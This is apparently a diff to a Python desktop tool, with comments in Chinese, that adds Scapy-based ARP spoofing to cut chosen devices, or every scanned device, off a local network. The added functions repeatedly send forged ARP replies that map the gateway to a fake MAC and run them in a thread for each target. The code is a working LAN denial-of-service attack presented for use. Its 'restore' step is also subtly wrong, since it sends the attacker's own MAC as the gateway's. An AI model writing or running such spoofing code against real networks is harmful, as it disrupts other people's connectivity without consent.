@@ -23,6 +23,44 @@ try:
 except:
     HAS_SCAPY = False
 
+# ============== ARP欺骗函数 ==============
+def arp_spoof_target(target_ip, gateway_ip, stop_event):
+    """
+    ARP欺骗: 持续向目标发送错误的ARP响应
+    让目标认为网关MAC是虚假的，从而断网
+    """
+    if not HAS_SCAPY:
+        return False
+    
+    try:
+        # 构造ARP响应包: 告诉target_ip，网关_ip的MAC是虚假的
+        # 使用一个不存在的MAC来代替网关
+        fake_mac = "00:11:22:33:44:55"
+        
+        # 发送ARP响应，声称网关IP对应fake_mac
+        arp_response = ARP(op=2, pdst=target_ip, hwdst=fake_mac, psrc=gateway_ip, hwsrc=fake_mac)
+        
+        while not stop_event.is_set():
+            send(arp_response, verbose=0)
+            time.sleep(0.5)  # 每0.5秒发送一次
+        
+        return True
+    except Exception as e:
+        print(f"ARP欺骗错误: {e}")
+        return False
+
+def arp_restore_target(target_ip, gateway_ip, gateway_mac):
+    """恢复目标设备的ARP表"""
+    if not HAS_SCAPY:
+        return
+    
+    try:
+        # 发送正确的ARP响应恢复网关
+        arp_response = ARP(op=2, pdst=target_ip, hwdst=gateway_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+        send(arp_response, verbose=0)
+    except:
+        pass
+
 # ============== 配置 ==============
 ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("blue")
@@ -341,8 +379,12 @@ class ARPGuiController(ctk.CTk):
         
         self.log(f"开始阻断: {', '.join(ips_to_block)}")
         
-        # 使用防火墙阻断
-        self.block_with_firewall(ips_to_block, duration)
+        # 优先使用ARP欺骗
+        if HAS_SCAPY:
+            self.block_with_arp(ips_to_block, duration)
+        else:
+            self.log("Scapy未安装，使用防火墙阻断")
+            self.block_with_firewall(ips_to_block, duration)
     
     def block_all(self):
         if not self.scanned_devices:
@@ -355,10 +397,75 @@ class ARPGuiController(ctk.CTk):
         
         ips = [d['ip'] for d in self.scanned_devices]
         self.log(f"批量阻断 {len(ips)} 个设备")
-        self.block_with_firewall(ips, duration)
+        
+        # 优先使用ARP欺骗
+        if HAS_SCAPY:
+            self.block_with_arp(ips, duration)
+        else:
+            self.log("Scapy未安装，使用防火墙阻断")
+            self.block_with_firewall(ips, duration)
+    
+    def block_with_arp(self, ips, duration):
+        """使用ARP欺骗阻断 (主要方案)"""
+        if not HAS_SCAPY:
+            self.log("Scapy未安装，无法使用ARP欺骗")
+            return
+        
+        gateway_ip = self.gateway_ip
+        stop_events = []
+        
+        self.log(f"使用ARP欺骗阻断 {len(ips)} 个设备...")
+        
+        for ip in ips:
+            # 为每个目标创建停止事件
+            stop_event = threading.Event()
+            stop_events.append((ip, stop_event))
+            
+            # 启动ARP欺骗线程
+            thread = threading.Thread(target=arp_spoof_target, 
+                                      args=(ip, gateway_ip, stop_event))
+            thread.daemon = True
+            thread.start()
+            
+            # 更新UI
+            for item in self.device_tree.get_children():
+                if self.device_tree.item(item)['values'][0] == ip:
+                    self.device_tree.item(item, values=(ip, self.device_tree.item(item)['values'][1], "ARP阻断中"))
+                    if ip not in self.blocked_ips:
+                        self.blocked_ips.append(ip)
+            
+            self.log(f"ARP欺骗已启动: {ip}")
+        
+        self.log(f"阻断设置完成，时长 {duration} 秒")
+        
+        # 定时解除
+        def unblock_after_delay():
+            time.sleep(duration)
+            for ip, stop_event in stop_events:
+                stop_event.set()
+                
+                # 尝试恢复ARP表
+                try:
+                    gateway_mac = get_local_mac()  # 使用本机MAC作为网关MAC
+                    arp_restore_target(ip, gateway_ip, gateway_mac)
+                except:
+                    pass
+                
+                if ip in self.blocked_ips:
+                    self.blocked_ips.remove(ip)
+                    
+                # 更新UI
+                for item in self.device_tree.get_children():
+                    if self.device_tree.item(item)['values'][0] == ip:
+                        self.device_tree.item(item, values=(ip, self.device_tree.item(item)['values'][1], "在线"))
+            
+            self.after(0, self.log, f"已自动解除阻断: {', '.join(ips)}")
+        
+        thread = threading.Thread(target=unblock_after_delay, daemon=True)
+        thread.start()
     
     def block_with_firewall(self, ips, duration):
-        """使用Windows防火墙阻断 (同时阻断入站和出站)"""
+        """使用Windows防火墙阻断 (备用方案)"""
         import subprocess
         
         rules = []
